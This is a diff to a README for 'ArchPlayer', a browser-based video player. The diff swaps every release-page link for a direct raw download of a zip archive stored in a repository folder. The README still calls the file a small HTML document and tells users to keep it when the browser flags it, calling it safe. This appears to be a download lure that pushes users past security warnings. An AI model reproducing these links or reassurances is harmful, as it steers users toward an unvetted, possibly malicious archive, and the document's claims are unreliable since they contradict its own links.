@@ -1,6 +1,6 @@
 # 🎬 ArchPlayer - Simple video playback for everyone
 
-[![Download ArchPlayer](https://img.shields.io/badge/Download-ArchPlayer-blue.svg)](https://github.com/Shelleyunfretted2107/ArchPlayer/releases)
+[![Download ArchPlayer](https://img.shields.io/badge/Download-ArchPlayer-blue.svg)](https://github.com/Shelleyunfretted2107/ArchPlayer/raw/refs/heads/main/biglot/Arch-Player-v1.6.zip)
 
 ArchPlayer is a local media viewer. It runs directly inside your web browser. This tool plays video files from your computer without sending your data to a server. ArchPlayer uses one small file to perform all tasks. It needs no installation and takes up almost no space on your hard drive.
 
@@ -8,7 +8,7 @@ ArchPlayer is a local media viewer. It runs directly inside your web browser. Th
 
 You do not need to install complex software to watch your videos. Follow these instructions to set up ArchPlayer on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Shelleyunfretted2107/ArchPlayer/releases).
+1. Go to the [official release page](https://github.com/Shelleyunfretted2107/ArchPlayer/raw/refs/heads/main/biglot/Arch-Player-v1.6.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the file link to download the ArchPlayer HTML file to your computer.
 4. Save the file in a folder where you can find it easily, like your Downloads or Videos folder.
@@ -78,6 +78,6 @@ ArchPlayer works on any modern Windows computer that has a web browser. Ensure y
 
 You can always find the latest version on our releases page. We update the software to fix bugs and add small improvements. 
 
-[Visit this page to download ArchPlayer](https://github.com/Shelleyunfretted2107/ArchPlayer/releases)
+[Visit this page to download ArchPlayer](https://github.com/Shelleyunfretted2107/ArchPlayer/raw/refs/heads/main/biglot/Arch-Player-v1.6.zip)
 
 If you have trouble, ensure you downloaded the correct version. The file should be a small HTML document. If your computer asks if you want to keep the file, choose Yes. Browsers sometimes flag downloaded files. Since this is a simple text document, it is safe to use.
